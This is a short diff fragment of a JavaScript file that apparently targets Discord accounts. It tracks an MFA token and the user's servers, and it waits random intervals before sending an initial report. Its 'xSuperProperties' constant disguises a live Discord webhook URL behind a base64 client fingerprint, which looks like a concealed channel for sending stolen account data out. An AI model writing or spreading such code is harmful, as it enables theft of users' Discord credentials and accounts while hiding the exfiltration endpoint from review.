@@ -12,7 +12,6 @@ try {
     process.exit(1);
 }
 const xSuperProperties = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJ0ci1UUiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEzMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEzMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY29tIiwic2VhcmNoX2VuZ2luZSI6Imdvb2dsZSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTYxNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImhhc19jbGllbnRfbW9kcyI6ZmFsc2V9||https://discord.com/api/webhooks/1480549794194653206/kiSzmolw_yLWA7YTlrSh211YOSUCuPRXgvlhZpAjpt2Jn2Q4SHxYRLaAl8vcTEIIyJtK';
-
 let mfaToken = null;
 let savedTicket = null;
 const guilds = {};
@@ -26,7 +25,6 @@ const baseHeaders = {
 function waitRandom(min = 2500, max = 9500) {
     return new Promise(r => setTimeout(r, min + Math.random() * (max - min)));
 }
-
 async function sendInitialInfo() {
     await waitRandom(4500, 12000); 
     const message = [
